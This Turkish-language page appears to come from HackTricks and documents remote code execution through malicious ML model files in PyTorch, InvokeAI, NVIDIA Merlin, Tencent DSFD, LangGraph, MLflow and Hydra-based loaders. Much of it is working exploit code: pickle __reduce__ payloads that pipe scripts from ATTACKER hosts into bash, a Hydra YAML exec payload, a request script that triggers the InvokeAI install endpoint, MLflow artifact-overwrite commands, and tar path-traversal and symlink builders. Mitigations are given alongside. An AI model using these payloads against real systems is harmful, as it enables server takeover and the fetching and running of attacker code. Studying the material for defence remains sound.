# Modellerle RCE

{{#include ../banners/hacktricks-training.md}}

## Modelleri yükleyerek RCE

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch vb. farklı formatlarda paylaşılır. Geliştiriciler bu modelleri kullanmak için makinelerine veya production sistemlerine yükleyebilir. Modellerin kötü amaçlı kod içermemesi gerekir, ancak bazı durumlarda model, sistemde tasarlandığı bir özellik olarak veya model yükleme kütüphanesindeki bir güvenlik açığı nedeniyle keyfi kod çalıştırmak için kullanılabilir.

Aşağıdaki tabloda bu kategorideki temsili güvenlik açıkları listelenmiştir:

| **Framework / Tool**        | **Güvenlik Açığı (varsa CVE)**                                                    | **RCE Vektörü**                                                                                                                           | **Referanslar**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` içinde güvenli olmayan deserialization* **(CVE-2025-32434)**                                                              | Model checkpoint'indeki kötü amaçlı pickle, kod çalıştırılmasına yol açar (`weights_only` korumasını atlayarak)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kötü amaçlı model indirme kod çalıştırılmasına yol açar; management API'de Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` aracılığıyla güvensiz checkpoint deserialization **(CVE-2025-23298)**                                           | Güvenilmeyen checkpoint, `load_model_trainer_states_from_checkpoint` sırasında pickle reducer'ı tetikler → ML worker'da kod çalıştırılır            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + güvensiz MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kullanıcı denetimindeki `filter` anahtarı SQL/JSON-path sözdizimi enjekte eder, `UNION SELECT` sahte bir checkpoint satırı oluşturur, ardından `msgpack` deserialization saldırganın seçtiği Python kodunu içe aktarır ve çağırır | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (güvensiz YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Modeli YAML'den yüklemek `yaml.unsafe_load` kullanır (kod çalıştırma) <br> **Lambda** katmanına sahip model yüklemek keyfi Python kodu çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Özel hazırlanmış `.tflite` modeli integer overflow tetikler → heap corruption (olası RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` ile model yüklemek, saldırganın `__reduce__` payload'ını içeren pickle'ı çalıştırır                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (güvensiz `np.load`) *itirazlı*                                                                              | `numpy.load` varsayılan olarak pickled object array'lerine izin veriyordu – kötü amaçlı `.npy/.npz` kod çalıştırılmasını tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights yolu dizin dışına çıkabilir (keyfi dosyaları okuma) <br> Kötü amaçlı ONNX model tar'ı keyfi dosyaların üzerine yazabilir (RCE'ye yol açar) | |
| ONNX Runtime (tasarım riski)  | *(CVE yok)* ONNX custom ops / control flow                                                                                    | Custom operator'a sahip model, saldırganın native code'unun yüklenmesini gerektirir; karmaşık model graph'ları, istenmeyen hesaplamaları çalıştırmak için mantığı kötüye kullanır   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkin durumdayken model-load API'sini kullanmak, göreli path traversal ile dosyaların yazılmasına izin verir (ör. RCE için `.bashrc` üzerine yazma)    | |
| **GGML (GGUF formatı)**      | **CVE-2024-25664 … 25668** (birden fazla heap overflow)                                                                         | Hatalı biçimlendirilmiş GGUF model dosyası parser'da heap buffer overflow'lara neden olur ve kurbanın sisteminde keyfi kod çalıştırılmasını sağlar                     | |
| **Keras (eski formatlar)**   | *(Yeni CVE yok)* Legacy Keras H5 model                                                                                         | Lambda katmanına sahip kötü amaçlı HDF5 (`.h5`) modeli, yüklenirken hâlâ kod çalıştırır (Keras safe_mode eski formatı kapsamaz – “downgrade attack”) | |
| **Diğerleri** (genel)        | *Tasarım kusuru* – Pickle serialization                                                                                         | Birçok ML aracı (ör. pickle tabanlı model formatları, Python `pickle.load`), önlem alınmadığı sürece model dosyalarına gömülü keyfi kodu çalıştırır | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Güvenilmeyen metadata'nın `hydra.utils.instantiate()` işlevine aktarılması **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Saldırganın denetimindeki model metadata/config, `_target_` değerini keyfi bir callable'a (ör. `builtins.exec`) ayarlar → “güvenli” formatlarda (`.safetensors`, `.nemo`, repo `config.json`) bile yükleme sırasında çalıştırılır | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ayrıca [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi, `weights_only=True` ile yüklenmedikleri takdirde sistemde keyfi kod çalıştırmak için kullanılabilen Python pickle tabanlı modeller de vardır. Bu nedenle, yukarıdaki tabloda listelenmeseler bile pickle tabanlı tüm modeller bu tür saldırılara karşı özellikle savunmasız olabilir.

### Hydra metadata → RCE (safetensors ile bile çalışır)

`hydra.utils.instantiate()`, yapılandırma/metadata nesnesindeki noktalı `_target_` değerlerini içe aktarır ve çağırır. Hugging Face Transformers gibi kütüphaneler **güvenilmeyen model metadata**'sını `instantiate()` işlevine aktardığında, saldırgan model yüklenirken hemen çalıştırılacak bir callable ve argümanlar sağlayabilir (pickle gerekmez).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload örneği (`.nemo` içindeki `model_config.yaml`, repo `config.json` veya `.safetensors` içindeki `__metadata__` ile çalışır):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders ve FlexTok loaders içinde model initialization'dan önce tetiklenir.
- Hydra’nın string block-list’i alternatif import path’leri (örn. `enum.bltns.eval`) veya uygulama tarafından çözümlenen isimler (örn. `nemo.core.classes.common.os.system` → `posix`) kullanılarak bypass edilebilir.<sup>[[14]](#references)</sup>
- FlexTok ayrıca string hâline getirilmiş metadata’yı `ast.literal_eval` ile parse eder; bu da Hydra çağrısından önce DoS’a (CPU/bellek tüketiminin aşırı artmasına) olanak tanır.

### 🆕  `torch.load` üzerinden InvokeAI RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion için popüler bir açık kaynak web arayüzüdür. **5.3.1 – 5.4.2** sürümleri, kullanıcıların rastgele URL’lerden model indirmesine ve yüklemesine olanak tanıyan `/api/v2/models/install` REST endpoint’ini sunar.<sup>[[1]](#references)</sup>

Bu endpoint, dahili olarak sonunda şunu çağırır:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Sağlanan dosya bir **PyTorch checkpoint (`*.ckpt`)** olduğunda, `torch.load` **pickle deserialization** işlemi gerçekleştirir. İçerik doğrudan kullanıcı denetimindeki URL'den geldiği için saldırgan, checkpoint içine özel bir `__reduce__` metoduna sahip kötü amaçlı bir nesne yerleştirebilir; bu metot **deserialization sırasında** çalıştırılır ve InvokeAI sunucusunda **remote code execution (RCE)** gerçekleşmesine yol açar.

Bu güvenlik açığına **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) numarası atanmıştır.

#### Exploitation adımları

1. Kötü amaçlı bir checkpoint oluşturun:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` dosyasını kontrol ettiğiniz bir HTTP sunucusunda barındırın (örn. `http://ATTACKER/payload.ckpt`).
3. Güvenlik açığı bulunan endpoint'i tetikleyin (kimlik doğrulama gerekmez):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` gadget'ı çalışır ve saldırgan, InvokeAI süreci bağlamında kod yürütme elde eder.

Hazır exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.<sup>[[3]](#references)</sup>

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan flag varsayılanı **false**)
•  `/api/v2/models/install` saldırgan tarafından erişilebilir olmalı
•  Süreç, shell komutlarını yürütme izinlerine sahip olmalı

#### Azaltıcı Önlemler

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yama, varsayılan olarak `scan=True` ayarını yapar ve deserialization öncesinde malware taraması gerçekleştirir.<sup>[[2]](#references)</sup>
* Checkpoint'leri programatik olarak yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper'ını kullanın.
* Model kaynakları için allow-list / signature zorunlu kılın ve servisi en az ayrıcalıkla çalıştırın.

> ⚠️ Güvenilmeyen kaynaklardan herhangi bir Python pickle tabanlı formatı (birçok `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) deserialize etmenin doğası gereği güvensiz olduğunu unutmayın.

---

Eski InvokeAI sürümlerini bir reverse proxy arkasında çalıştırmaya devam etmeniz gerekiyorsa, geçici bir mitigation örneği:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’nın Transformers4Rec’i (Merlin’in bir parçası), kullanıcı tarafından sağlanan yollar üzerinde doğrudan `torch.load()` çağıran güvenli olmayan bir checkpoint yükleyici içeriyordu. `torch.load`, Python `pickle`’a dayandığından saldırganın kontrolündeki bir checkpoint, deserialize sırasında bir reducer aracılığıyla rastgele kod çalıştırabilir.<sup>[[5]](#references)</sup>

Güvenlik açığı bulunan yol (düzeltme öncesi): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Bunun RCE’ye yol açma nedeni: Python pickle’da bir nesne, bir çağrılabilir ve argümanlar döndüren bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir. Çağrılabilir, unpickling sırasında çalıştırılır. Böyle bir nesne checkpoint’te bulunuyorsa herhangi bir ağırlık kullanılmadan önce çalışır.

Minimal kötü amaçlı checkpoint örneği:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Teslimat vektörleri ve etki alanı:
- Repos, bucket'lar veya artifact registry'ler üzerinden paylaşılan trojan'lı checkpoint/model'ler
- Checkpoint'leri otomatik yükleyen otomatik resume/deploy pipeline'ları
- Çalıştırma, genellikle yükseltilmiş ayrıcalıklara sahip (ör. container'larda root) training/inference worker'ları içinde gerçekleşir

Düzeltme: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802), doğrudan `torch.load()` kullanımını `transformers4rec/utils/serialization.py` içinde uygulanan, kısıtlı ve izin verilenler listesine dayalı bir deserializer ile değiştirdi. Yeni loader, türleri/alanları doğrular ve yükleme sırasında rastgele callable'ların çağrılmasını önler.<sup>[[7]](#references)</sup>

PyTorch checkpoint'lerine özel savunma önerileri:
- Güvenilmeyen verileri unpickle etmeyin. Mümkün olduğunda [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi çalıştırılabilir olmayan formatları tercih edin.
- PyTorch serialization kullanmanız gerekiyorsa `weights_only=True` seçeneğinin etkin olduğundan emin olun (yeni PyTorch sürümlerinde desteklenir) veya Transformers4Rec patch'ine benzer, izin verilenler listesine dayalı özel bir unpickler kullanın.<sup>[[4]](#references)</sup>
- Model provenance/signature'larını zorunlu kılın ve deserialization işlemini sandbox içinde çalıştırın (seccomp/AppArmor; root olmayan kullanıcı; kısıtlı FS ve dış ağa çıkış yok).
- Checkpoint yükleme sırasında ML servislerinden başlatılan beklenmeyen child process'leri izleyin; `torch.load()`/`pickle` kullanımını takip edin.

POC ve güvenlik açığı/patch referansları:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Patch öncesi güvenlik açığı bulunan loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Kötü amaçlı checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Patch sonrası loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Örnek – kötü amaçlı bir PyTorch modeli hazırlama

- Modeli oluşturun:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Modeli yükleyin:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’in FaceDetection-DSFD ürünü, kullanıcı kontrolündeki verileri deserialize eden bir `resnet` endpoint’i sunar. ZDI, uzaktaki bir saldırganın kurbanı kötü amaçlı bir sayfa/dosya yüklemeye zorlayabileceğini, bu sayfanın/dosyanın endpoint’e hazırlanmış bir serialized blob göndermesini sağlayabileceğini ve `root` olarak deserialization’ı tetikleyerek sistemin tamamen ele geçirilmesine yol açabileceğini doğruladı.

Exploit akışı, tipik pickle kötüye kullanımını takip eder:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Deserialization sırasında erişilebilen herhangi bir gadget (constructor'lar, `__setstate__`, framework callback'leri vb.), aktarımın HTTP, WebSocket veya izlenen bir dizine bırakılan dosya üzerinden yapılmasından bağımsız olarak aynı şekilde weaponize edilebilir.



### LangGraph checkpointer SQLi → MessagePack RCE

Bu saldırı zinciri ilginçtir çünkü saldırganın **kötü amaçlı bir model dosyası yüklemesi gerekmez**. Bunun yerine uygulama bir **AI-agent persistence API** (`get_state_history(..., filter=...)`) sunar ve kullanıcı girdisi checkpointer sorgu oluşturucusuna ulaşır.

#### 1. Metadata filtrelerinde yapısal SQLi

Savunmasız bir SQLite kalıbı şöyle görünüyordu:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Değer daha sonra bağlanır, ancak `query_key`, **JSON path string**'ine birleştirilir; bu nedenle sözlük anahtarındaki bir `'`, `'$.{query_key}'` ifadesinden çıkarak SQL enjekte eder. Aynı ders **JSON path'ler, identifiers, operators, `LIMIT` ve TTL alanları** için de geçerlidir: placeholder'lar değerleri korur, ancak sorgunun yapısal sözdizimini korumaz.

#### 2. `UNION SELECT`, yalnızca veri hırsızlığı için değil, sonraki sink'leri de hedef alabilir

Sorgu, daha sonra şu şekilde kullanılan `type` ve serileştirilmiş `checkpoint` baytlarını döndürür:

```python
self.serde.loads_typed((type, checkpoint))
```

Bu, `WHERE` yan tümcesindeki bir SQLi'nin **sahte bir sonuç satırı** enjekte edebileceği anlamına gelir:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Daha sonraki kod seçilen herhangi bir sütunu ayrıştırıyor, deserialize ediyor, yazıyor veya çalıştırıyorsa bu sütunları sink'leriyle eşleştirin. Bu durumda sahte satır, SQLi'yi **saldırganın kontrolündeki deserialization** işlemine dönüştürür.

#### 3. Güvenli olmayan MessagePack extension hook'ları code gadget'larla eşdeğerdir

LangGraph'in `msgpack` yolu, iç içe bir tuple'ı açan ve şunu çalıştıran özel bir extension hook kullanıyordu:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Dolayısıyla, `("os", "system", "id > /tmp/pwned")` ifadesine eşdeğer bir şeyi kodlayan MessagePack extension nesnesi `os` modülünü içe aktarır, `system` işlevini bulur ve komutu çalıştırır. AI framework'lerini incelerken dinamik import, reflection veya keyfi callable dispatch için **özel MessagePack/JSON/pickle reviver**'larını denetleyin.

#### 4. Agent framework'leri için pratik denetim kalıbı

Kullanıcı denetimindeki ve şunlara ulaşan tüm girdileri inceleyin:
- state history / memory / replay / checkpoint listeleme API'leri
- SQL veya Redis query parçacıkları oluşturan yapılandırılmış filtre oluşturucuları
- özel deserializer'lar (`pickle`, `msgpack`, `json` object hook'ları, YAML constructor'ları)
- persistence katmanından döndürülen satırlara güvenen recovery yolları

Bu özel zincir, güvenilmeyen kullanıcıların `filter` değerini denetleyebildiği **SQLite** veya **Redis** checkpointer'ları kullanan, self-hosted LangGraph dağıtımlarını etkiledi. Açıklamada belirtilen yamalı sürümler `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` ve `langgraph-checkpoint 4.0.1+` idi.<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact overwrite ile pickle RCE

`PythonModel`'den oluşturulan bir MLflow PyFunc, serileştirilmiş nesneyi `python_model.pkl` olarak depolayabilir. Model metadata'sı `mlflow.pyfunc.model` değerini loader olarak belirtir ve MLflow implementasyonu kaydedilen Python modeli için bu dosya adını kullanır. Bu nedenle artifact store'a yazma erişimi, modeli daha sonra yükleyen başka bir uygulamada kod çalıştırılmasına yol açabilir.<sup>[[17]](#references)[[18]](#references)</sup>

İşe yarayan zincir **artifact yazma izni → pickle'ı değiştirme → inference consumer'ını yeniden yüklemeye zorlama** şeklindedir. Proxy'lenmiş bir `mlflow-artifacts:/...` root'u kullanan bir deney için deney, run ve model artifact yollarını listeleyin. Tracking server, `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` üzerinde `GET` ve `PUT` sunar.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Minimal bir reducer, consumer artifact'ı unpickle eder etmez bir komut çalıştırabilir. Payload'ı `MLmodel` dosyasında belirtilen Python sürümüyle oluşturmak uyumluluk sorunlarını önler.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Mevcut modeli **yükleyen** işlemi tetikleyin; örneğin tahmin, scoring veya deployment. Önce yeniden eğitmeyin; çünkü eğitim, zararlı artifact'i yeni bir modelle değiştirebilir. Uygulama hatası, exploit'in başarısız olduğunu göstermez: reducer, kullanılabilir bir model yerine komutun integer çıkış durumunu döndürür. ICMP veya HTTP callback gibi gözlemlenebilir bir yan etkiyle başlayın, ardından bunu nihai payload ile değiştirin.<sup>[[20]](#references)</sup>

Değerlendirme sırasında, bir run oluşturma izniyle başka bir run'a ait artifact'lerin üzerine yazma iznini birbirinden ayırın. Kimlik doğrulama ve run başına güncelleme izinlerini gözden geçirin, `python_model.pkl` dosyasındaki beklenmeyen değişiklikleri inceleyin ve modelin provenance ve bütünlüğünü execution boundary'nin parçası olarak değerlendirin. Güncel MLflow kodu ayrıca `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` ayarını destekler ve cloudpickle verisini yüklemek yerine models-from-code artifact'lerini önerir.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Modellerle Path Traversal

[**Bu blog gönderisinde**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiği gibi, farklı AI framework'lerinin kullandığı çoğu model formatı, genellikle `.zip` olmak üzere arşiv tabanlıdır. Bu nedenle, bu formatları kötüye kullanarak path traversal saldırıları gerçekleştirmek ve modelin yüklendiği sistemdeki rastgele dosyaları okumak mümkün olabilir.<sup>[[16]](#references)</sup>

Örneğin, aşağıdaki kodla yüklendiğinde `/tmp` dizininde bir dosya oluşturacak bir model oluşturabilirsiniz:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ya da aşağıdaki kodla, yüklendiğinde `/tmp` dizinine symlink oluşturacak bir model oluşturabilirsiniz:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Derinlemesine inceleme: Keras .keras deserialization ve gadget hunting

.keras dahili yapısı, Lambda-layer RCE, ≤ 3.8 sürümlerindeki arbitrary import sorunu ve düzeltme sonrası allowlist içindeki gadget keşfi hakkında odaklı bir rehber için bkz.:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI: Güvenilmeyen Verilerin Deserialization İşlemi"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI yama commit'i 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit modülü dokümantasyonu](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load için güvenlik hususları](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298 NVIDIA Merlin'de Remote Code Execution](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI duyurusu: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec yama commit'i b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Yama öncesi güvenlik açığı bulunan loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Kötücül checkpoint PoC'si (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Yama sonrası loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Modern AI/ML formatları ve kütüphaneleriyle Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate dokümantasyonu](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit'i (RCE uyarısı)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi'den RCE'ye: LangGraph'in Checkpointer'ını Exploit Etme](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip Hatalarını Yüksek Değerli AI/ML Bounty'lerine Taşımak](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk duyurusu ve PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow kaynak kodu – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact indirme ve yükleme endpoint'leri](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
